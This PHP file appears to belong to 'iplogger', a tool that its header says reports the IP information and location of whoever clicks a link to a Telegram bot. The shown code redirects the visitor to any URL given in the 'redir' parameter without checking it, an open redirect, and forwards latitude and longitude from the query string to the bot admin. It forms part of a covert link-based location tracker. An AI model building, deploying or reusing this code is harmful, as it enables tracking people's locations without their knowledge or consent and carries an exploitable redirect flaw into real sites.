<?php


/*
    iplogger - receive on telegram the ip info and the location of the user who clicked the link
    Copyright (C) 2018  91DarioDev github.com/91DarioDev

    iplogger is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    iplogger is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with iplogger.  If not, see <http://www.gnu.org/licenses/>.
*/


require('telegramapi.php');
require('config.php');
require('ipapi.php');
require('tinyurlapi.php');

if (!empty($_GET['redir'])){
	header('Location: '.$_GET['redir']);
}


sendLocation(
  $bot_admin_id, 
  (float)$_GET['lat'], 
  (float)$_GET['lon'],
  null,
  false,
  (int)$_GET['mid']
);

?>